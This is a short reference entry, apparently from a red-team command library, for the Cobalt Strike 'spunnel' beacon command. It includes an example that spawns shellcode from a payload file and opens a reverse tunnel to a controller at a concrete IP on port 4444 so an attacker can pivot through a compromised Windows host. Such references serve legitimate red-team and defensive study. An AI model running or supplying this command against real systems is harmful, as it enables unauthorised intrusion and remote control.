---
id: 45188888-e4a4-492a-9c3b-41b007287dc2
name: cobalt-strike-spunnel
type: command
executor: bash
data: beacon > spunnel $_ARCH $_CONTROLLER_IP $_CONTROLLER_PORT $_PAYLOAD_PATH
output: null
created_at: '2023-04-06T03:56:16.576446+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - pivoting
  - spunnel
verified: true
validated: true
---

# cobalt-strike-spunnel

## Command

```bash
beacon > spunnel $_ARCH $_CONTROLLER_IP $_CONTROLLER_PORT $_PAYLOAD_PATH
```

## Description

Spawns a new agent using the provided payload and creates a reverse port forward tunnel directly to the controller.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_ARCH | Architecture: x64 or x86 | Yes |
| $_CONTROLLER_IP | IP of Cobalt Strike controller | Yes |
| $_CONTROLLER_PORT | Port on controller | Yes |
| $_PAYLOAD_PATH | Path to shellcode payload (e.g., C:\Payloads\msf.bin) | Yes |

## Examples

### Basic Usage

```bash
beacon > spunnel x64 184.105.181.155 4444 C:\Payloads\msf.bin
```

## Expected Output

New Beacon session: "New beacon connection". Tunnel active for pivoting.

## Related

- [[procedures/Establish-VPN-Like-Connection-and-Pivot-Using-Cobalt-Strike]]
- [[tools/Cobalt-Strike]]
